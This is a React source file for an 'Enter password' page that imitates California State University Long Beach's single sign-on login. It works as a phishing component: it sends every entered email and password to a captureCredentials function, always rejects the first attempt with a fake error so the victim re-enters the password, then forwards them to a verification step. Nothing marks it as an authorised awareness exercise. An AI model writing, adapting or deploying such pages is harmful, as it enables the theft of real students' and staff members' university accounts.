import { useNavigate, useSearchParams } from 'react-router';
import { useState, useEffect } from 'react';
import { trackEvent, captureCredentials } from '../api';
import { CsulbPage, SsoCard, SsoBoilerplate, SsoButton, CsulbLogo } from './SsoLayout';

export function EnterPassword() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const email = searchParams.get('email') || '';
  const [password, setPassword] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    trackEvent('password_view');
  }, []);

  const handleSignIn = async () => {
    if (!password.trim()) return;
    setIsLoading(true);
    setError('');
    await captureCredentials(email, password);

    if (attemptCount === 0) {
      setTimeout(() => {
        setIsLoading(false);
        setError("Your account or password is incorrect. If you don't remember your password, reset it now.");
        setPassword('');
        setAttemptCount(1);
      }, 1500);
    } else {
      setTimeout(() => {
        setIsLoading(false);
        navigate(`/verify?email=${encodeURIComponent(email)}`);
      }, 1500);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') handleSignIn();
  };

  return (
    <CsulbPage>
      <SsoCard>
        <div className="sso-page-content" style={{ padding: '44px' }}>
          <CsulbLogo />

          {/* Back arrow + email */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '4px',
              fontSize: '13px',
              color: '#1b1b1b',
              marginBottom: '4px',
              cursor: 'pointer',
            }}
            onClick={() => navigate('/sign-in')}
          >
            <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
              <path d="M8 1L3 6L8 11" stroke="#1b1b1b" strokeWidth="1.5" fill="none" />
            </svg>
            <span>{email}</span>
          </div>

          <h1 style={{ fontSize: '24px', fontWeight: 600, margin: '16px 0 12px', lineHeight: '28px', color: '#1b1b1b' }}>
            Enter password
          </h1>

          {/* Error */}
          {error && (
            <div style={{ color: '#e81123', fontSize: '13px', marginBottom: '12px', lineHeight: '1.4' }}>
              {error}
            </div>
          )}

          {/* Password Input */}
          <div style={{ marginBottom: '16px' }}>
            <input
              type="password"
              value={password}
              onChange={(e) => { setPassword(e.target.value); setError(''); }}
              onKeyDown={handleKeyDown}
              placeholder="Password"
              autoFocus
              disabled={isLoading}
              style={{
                width: '100%',
                fontSize: '15px',
                padding: '6px 10px 6px 0',
                border: 'none',
                borderBottom: `1px solid ${error ? '#e81123' : '#666'}`,
                outline: 'none',
                color: '#1b1b1b',
                backgroundColor: 'transparent',
                boxSizing: 'border-box',
                fontFamily: 'inherit',
                height: '36px',
              }}
            />
          </div>

          {/* Reset password */}
          <div style={{ marginBottom: '20px' }}>
            <a href="#" style={{ color: '#0067b8', fontSize: '13px' }}>Reset my password</a>
          </div>

          {/* Sign In Button */}
          <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
            <SsoButton onClick={handleSignIn} disabled={!password.trim() || isLoading}>
              {isLoading ? 'Signing in...' : 'Sign in'}
            </SsoButton>
          </div>
        </div>

        <SsoBoilerplate />
      </SsoCard>
    </CsulbPage>
  );
}
